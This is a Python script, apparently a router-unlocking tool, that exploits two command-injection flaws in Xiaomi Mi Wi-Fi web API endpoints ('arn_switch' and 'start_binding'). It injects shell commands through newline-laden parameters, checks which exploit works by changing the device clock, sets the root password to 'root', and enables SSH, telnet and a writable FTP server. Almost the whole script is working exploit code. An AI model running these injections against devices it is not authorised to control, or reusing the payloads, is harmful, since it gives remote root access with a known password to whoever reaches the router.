#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import requests

import xmir_base
from gateway import *


gw = Gateway(timeout = 4, detect_ssh = False)
if gw.status < 1:
    die(f"Xiaomi Mi Wi-Fi device not found (IP: {gw.ip_addr})")

print(f"device_name = {gw.device_name}")
print(f"rom_version = {gw.rom_version} {gw.rom_channel}")
print(f"mac address = {gw.mac_address}")

dn = gw.device_name
gw.ssh_port = 22
ret = gw.detect_ssh(verbose = 1, interactive = True)
if ret == 23:
    if gw.use_ftp:
        die("Telnet and FTP servers already running!")
    print("Telnet server already running, but FTP server not respond")
elif ret > 0:
    #die(0, "SSH server already installed and running")
    pass

info = gw.get_init_info()
if not info or info["code"] != 0:
    die('Cannot get init_info')

ccode = info["countrycode"]
print(f'Current CountryCode = {ccode}')

stok = gw.web_login()


def exploit_1(cmd = { }, api = 'misystem/arn_switch'):
    # vuln/exploit author: ?????????
    params = cmd
    if isinstance(cmd, str):
        cmd = cmd.replace(';', '\n')
        params = { 'open': 1, 'mode': 1, 'level': "\n" + cmd + "\n" }
    res = requests.get(gw.apiurl + api, params = params)
    return res.text

def exploit_2(cmd = { }, api = 'xqsystem/start_binding'):
    # vuln/exploit author: ?????????
    params = cmd
    if isinstance(cmd, str):
        cmd = cmd.replace(';', '\n')
        params = { 'uid': 1234, 'key': "1234'\n" + cmd + "\n'" }
    res = requests.get(gw.apiurl + api, params = params)
    return res.text


# get device orig system time
dst = gw.get_device_systime()

exec_cmd = None
exp_list = [ exploit_2, exploit_1 ]
for exp_func in exp_list:
    res = exp_func("date -s 203301020304")
    #if '"code":0' not in res:
    #    continue
    time.sleep(1.2)
    dxt = gw.get_device_systime()
    if dxt['year'] == 2033 and dxt['month'] == 1 and dxt['day'] == 2:
        if dxt['hour'] == 3 and dxt['min'] == 4:
            exec_cmd = exp_func
            break
    time.sleep(1)

# restore orig system time
time.sleep(1)
gw.set_device_systime(dst)

if not exec_cmd:
    die('Exploits arn_switch/start_binding not working!!!')

if exec_cmd == exploit_1:
    print('Exploit "arn_switch" detected!') 

if exec_cmd == exploit_2:
    print('Exploit "start_binding" detected!') 


exec_cmd(r"sed -i 's/release/XXXXXX/g' /etc/init.d/dropbear")
exec_cmd(r"nvram set ssh_en=1 ; nvram set boot_wait=on ; nvram set bootdelay=3 ; nvram commit")
exec_cmd(r"echo -e 'root\nroot' > /tmp/psw.txt ; passwd root < /tmp/psw.txt")
exec_cmd(r"/etc/init.d/dropbear enable")

print('Run SSH server on port 22 ...')
exec_cmd(r"/etc/init.d/dropbear restart")
exec_cmd(r"logger -t XMiR ___completed___")

time.sleep(0.5)
gw.use_ssh = True
gw.passw = 'root'
ssh_en = gw.ping(verbose = 0, contimeout = 11)   # RSA host key generate slowly!
if ssh_en:
    print('#### SSH server are activated! ####')
else:
    print(f"WARNING: SSH server not responding (IP: {gw.ip_addr})")

if not ssh_en:
    print("")
    print('Unlock TelNet server ...')
    exec_cmd("bdata set telnet_en=1 ; bdata commit")
    print('Run TelNet server on port 23 ...')
    exec_cmd("/etc/init.d/telnet enable ; /etc/init.d/telnet restart")
    time.sleep(0.5)
    gw.use_ssh = False
    telnet_en = gw.ping(verbose = 2)
    if not telnet_en:
        print(f"ERROR: TelNet server not responding (IP: {gw.ip_addr})")
        sys.exit(1)
    print("")
    print('#### TelNet server are activated! ####')
    #print("")
    #print('Run FTP server on port 21 ...')
    gw.run_cmd(r"rm -f /etc/inetd.conf")
    gw.run_cmd(r"sed -i 's/\\tftpd\\t/\\tftpd -w\\t/g' /etc/init.d/inetd")
    gw.run_cmd('/etc/init.d/inetd enable')
    gw.run_cmd('/etc/init.d/inetd restart')
    gw.use_ftp = True
    ftp_en = gw.ping(verbose = 0)
    if ftp_en:
        print('#### FTP server are activated! ####')
    else:
        print(f"WARNING: FTP server not responding (IP: {gw.ip_addr})")

if ssh_en or telnet_en:
    gw.run_cmd('nvram set uart_en=1; nvram set boot_wait=on; nvram commit')
    gw.run_cmd('nvram set bootdelay=3; nvram set bootmenu_delay=5; nvram commit')

